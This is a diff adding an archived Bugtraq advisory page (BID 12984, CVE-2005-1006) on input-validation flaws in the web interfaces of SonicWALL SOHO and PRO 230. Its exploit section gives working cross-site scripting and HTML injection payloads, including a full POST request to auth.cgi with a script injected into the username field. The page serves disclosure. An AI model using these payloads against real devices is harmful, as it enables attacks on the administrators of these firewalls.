@@ -1,0 +1,100 @@
+#SpeeDr00t@Black Falcon<br>#bid12984<p><b><span style="font-size: 18pt;">SonicWALL SOHO Web Interface Multiple Remote Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/12984/info">info</a><br><a href="http://www.securityfocus.com/bid/12984/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/12984/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/12984/solution">solution</a><br><a href="http://www.securityfocus.com/bid/12984/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				12984
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2005-1006<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 04 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 12 2009 11:56AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				"Oliver Karow" &lt;Oliver.Karow@gmx.de&gt; is credited with the discovery of these issues.  Dev Appan reported that SonicWALL Pro is affected by these issues as well.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					SonicWALL SOHO 5.1.7 .0<br/>
+					
+				
+					SonicWALL PRO 230 6.5 .0.3<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required to leverage either of these issues.  The following proof of concepts have been made available:<br/><br/>To leverage the cross-site scripting issue:<br/>http://www.example.com/&amp;lt;script&amp;gt;alert("Its not magic... its a sonic")&amp;lt;/script&amp;gt;<br/><br/>To leverage the HTML injection issue enter the following into the 'username' field of the login form:<br/><br/>&amp;lt;/TD&amp;gt;&amp;lt;script&amp;gt;alert("!")&amp;lt;/script&amp;gt;<br/><br/>It is also possible to leverage the HTML injection issue by submitting the following POST request:<br/><br/>                POST http://192.168.168.168:80/auth.cgi HTTP/1.0<br/>                Accept: */*<br/>                Referer: http://192.168.168.168/auth.html<br/>                Accept-Language: de<br/>                Content-Type: application/x-www-form-urlencoded<br/>                Proxy-Connection: Keep-Alive<br/>                User-Agent: BadGuy<br/>                Host: 192.168.168.168<br/>                Content-Length: 160<br/>                Pragma: no-cache               uName=&amp;lt;/TD&amp;gt;&amp;lt;script&amp;gt;alert("Its_not_magic..._its_a_sonic")&amp;lt;/script&amp;gt;&amp;amp;pass=NiceTry&amp;amp;Submit=Login&amp;amp;clientHash=bbe63bb858b02e741d2d12023ee350a1
+	
+		<ul>
+</ul>
+</div>
